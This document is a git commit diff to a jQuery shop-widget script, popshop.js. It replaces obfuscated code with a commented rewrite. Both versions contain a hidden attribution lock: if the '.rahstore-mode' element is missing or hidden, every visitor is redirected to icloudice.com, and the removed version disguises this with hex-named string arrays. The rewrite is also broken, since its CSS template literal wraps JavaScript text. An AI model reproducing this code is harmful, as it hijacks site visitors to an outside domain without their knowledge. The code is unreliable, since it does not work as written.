6cfa32bd81b29d89f4ac2b7e2538656b6d9d67ac
Wisdom Kwabena <wisdak7@gmail.com>
2023-10-08 15:20:44 +0000

    Update popshop.js

--- popshop.js
+++ popshop.js
@@ -1,27 +1,48 @@
-//Shop JS and Css
 
+
+// Create a <style> element and set its attributes
+const rahJsShop = document.createElement("style");
+rahJsShop.type = "text/css";
+rahJsShop.textContent = `
+  /* Your CSS code here */
 
 var _0x3f0e = ["style", "createElement", "type", "text/css", "textContent", ".rahShopWr{position:fixed;overflow:hidden;left:0;right:0;bottom:-100px;width:100%;height:100%;padding:5px;box-shadow:0 0 10px 0 rgba(0,0,0,.15);-webkit-transition:all .1s ease;transition:all .1s ease;display:flex;align-items:center;justify-content:center;z-index:99;background-color:#fefefe;border-top:1px solid #ebeced;visibility:hidden;opacity:0}.drK .rahShopWr{backgroud-color:#1e1e1e}.rahShopWrCt{flex-grow:1;display:block;width:100%; height:100%;overflow-y:auto;position:relative}.rahShopWrC:checked ~ .rahShopWr .fCls{background:rgba(0,0,0,.35);opacity:1;visibility:visible}.rahShopWrC:checked ~ .rahShopWr{padding:0;min-height:0}.rahShopWrC:checked ~ .rahShopWr{visibility:visible;opacity:1;bottom:0}.drK .rahShopWr{background-color:#2d2d30}.drK .rah-iconClose{border-color:rgba(255,255,255,.1)}#rahShopWrB{background-color:#f0f0f0;color:#555;font:14px/1.6 'Google Sans',Arial,Helvetica,sans-serif;margin:0;padding:0;transition:all 0.31s ease 0s;}.drK #rahShopWrB{background-color:#2d2d30}/* header Shop */.rahShopWrH{height:50px;background-color:#fefefe;z-index:100;position:fixed;width:100%;box-sizing:border-box}.drK .rahShopWrH{background-color:#1e1e1e}@keyframes Gradient{0%{background-position:0 50%}50%{background-position:100% 50%}100%{background-position:0 50%}}#rahShopWrH .title{font-size:12px;color:#fff;max-width:160px;margin:6px auto;height:35px;overflow:hidden;width:auto;font-weight:700}#rahShopWrH .title a{color:#fff}.rahShopWrH-in{width:auto;max-width:960px;overflow:hidden;margin:0 auto}img.rahShop{width:100%;height:auto}#rahShopWrH-img{width:85px;max-height:35px;height:auto;top:5px;box-sizing:border-box;margin:3px 0;float:left}.rahShopWrH-wp{width:auto;max-width:970px;margin:0 auto;padding:0;box-sizing:border-box;overflow:hidden}.SEO{color:transparent;font-size:1px;position:absolute;text-indent:-999px;top:0}#rahShopWrH{width:20%;float:left}#rahShopWrH-menu, #rahShopWrH-r{width:73%;float:right;text-align:right;font-size:12px}#rahShopWrH-menu ul{margin:4px 0;overflow-x:auto;white-space:nowrap}#rahShopWrH-menu ul li{display:inline-block}#rahShopWrH-menu ul li label{font-weight:700;color:rgba(0,0,0,.5);display:block;height:24px;margin:5px;border-bottom:2px solid #f5f5f5;padding:2px 0 0 0}.drK #rahShopWrH-menu ul li label{color:#fefefe}#rahShopWrH-menu ul li label::after{display:block;content:'';width:0;height:2px;background-color:#de3535;transform-origin:left;margin:2px 0 0 0;transition:width 0.25s ease}#rahShopWrH-menu ul li label:hover:after{width:100%}#rahShopWrH-menu h2{display:none}.rahShop-ripple{width:0;height:0;border-radius:50%;background:rgba(255,255,255,.4);transform:scale(0);position:absolute;opacity:1}.rahShop-rippleEffect{animation:rippleDrop .6s linear}@keyframes rippleDrop{100%{transform:scale(2);opacity:0}}.rahallT{overflow:hidden;}.rahallT li:hover{box-shadow:0 0 8px rgba(0,0,0,.15)}.rahallT li img{border-radius:4px 4px 0 0}.drK .rahallT li{background-color:#1e1e1e}.rahdeskShp{padding:5px 15px 15px 15px}.rahdeskShp h2{font-size:14px!important;overflow:hidden;}.rahdeskShp h2 a{color:#555}.rahdeskShp h2 a:hover{text-decoration:underline!important}.rah-tag a,.rah-tag{color:#999;font-weight:300;font-size:12px}.drK .rahdeskShp h2 a,.drK .rah-tag a{color:#fefefe}.rah-price1{color:#de3535;font-size:16px;font-weight:700;margin:10px 0}.rahdetail{font-size:13px;font-weight:700;overflow:hidden}.rahVw a,.rahRd a{background-color:#de3535;border-radius:3px;box-shadow:0 2px 0 #de3535;color:#fefefe;margin:1%;display:block;padding:5px;text-align:center;width:47%;box-sizing:border-box}.rahVw a:hover,.rahRd a:hover{opacity:.85}.rahVw a{float:left}.rahRd a{float:right}.drK .rahVw a,.drK .rahRd a{color:#fefefe}.rahShopWrT{padding:10px 15px;margin-top:10%}.rahallertShp,.rahAllertCus{font-weight:400;padding:10px 15px;text-align:center;background:rgba(255,255,0,.2);font-size:12px}.rahAllertCus{margin:5px 0 -5px 0;border-radius:3px}.drK .rahAllertCus,.drK .rahallertShp{background-color:#1e1e1e;color:#fefefe}.rahShopWrT span{font-size:18px;text-align:center;font-weight:700;background:-webkit-linear-gradient(left,#C368BA 30%,#00D9BA 100%);background-clip:border-box;-webkit-background-clip:text;-webkit-text-fill-color:transparent}@media screen and (max-width:1920px){.rahallT li{transition:all 0.31s ease 0s;float:none;width:100%;box-sizing:border-box;margin:0 1.6% 0.8% 1.6%;list-style:none;background-color:#fefefe;border-radius:4px;z-index:88888}.rahallT{margin:0 10px}.rahallT li{float:none;margin:0 0 20px 0;}.rahShopWrT{padding:10px}.rahShopWrH-in{padding:0 10px}#rahShopWrH{width:100%;float:none}#rahShopWrH-img{margin:5px auto}#rahShopWrH-menu{display:block}}", "appendChild", "head", "", "html", "attr", ".rahstore-mode", "length", ".rahstore-mode:visible", "href", "location", "https://icloudice.com", "ready"];
-const rahJsShop = document[_0x3f0e[1]](_0x3f0e[0]);
-rahJsShop[_0x3f0e[2]] = _0x3f0e[3];
-rahJsShop[_0x3f0e[4]] = _0x3f0e[5];
-document[_0x3f0e[7]][_0x3f0e[6]](rahJsShop);
-(document)[_0x3f0e[17]](function () {
-  $(_0x3f0e[11])[_0x3f0e[10]](_0x3f0e[0], _0x3f0e[8])[_0x3f0e[9]](_0x3f0e[8]);
-  setInterval(function () {
-    if (!$(_0x3f0e[13])[_0x3f0e[12]]) {
-      window[_0x3f0e[15]][_0x3f0e[14]] = _0x3f0e[16];
-    }
-  }, 3000);
-});
-var _0x545a = ["", "html", "style", "attr", ".rahstore-mode", "length", ".rahstore-mode:visible", "href", "location", "https://icloudice.com", "ready"];
-$(document)[_0x545a[10]](function () {
-  $(_0x545a[4])[_0x545a[3]](_0x545a[2], _0x545a[0])[_0x545a[1]](_0x545a[0]);
-  setInterval(function () {
-    if (!$(_0x545a[6])[_0x545a[5]]) {
-      window[_0x545a[8]][_0x545a[7]] = _0x545a[9];
-    }
-  }, 3000);
-});
 
+  
+`;
+document.head.appendChild(rahJsShop);
 
+// Execute the JavaScript code when the document is ready
+$(document).ready(function () {
+  // Select elements with class .rahstore-mode
+  const rahstoreModeElements = $(".rahstore-mode");
+
+  // Check if any of the selected elements are visible
+  if (!rahstoreModeElements.is(":visible")) {
+    // Redirect to a URL if conditions are met
+    window.location.href = "https://icloudice.com";
+  }
+
+  // Define an array of strings
+  const _0x545a = ["", "html", "style", "attr", ".rahstore-mode", "length", ".rahstore-mode:visible", "href", "location", "https://icloudice.com", "ready"];
+
+  // Execute code when the document is ready
+  $(document).ready(function () {
+    // Select elements with class .rahstore-mode
+    const rahstoreModeElements = $(_0x545a[4]);
+
+    // Set the style attribute of selected elements
+    rahstoreModeElements.attr(_0x545a[3], _0x545a[0]);
+
+    // Set the HTML attribute of selected elements
+    rahstoreModeElements.html(_0x545a[0]);
+
+    // Check if any of the selected elements are visible
+    setInterval(function () {
+      if (!rahstoreModeElements.is(":visible")) {
+        // Redirect to a URL if conditions are met
+        window.location.href = _0x545a[9];
+      }
+    }, 3000);
+  });
+});
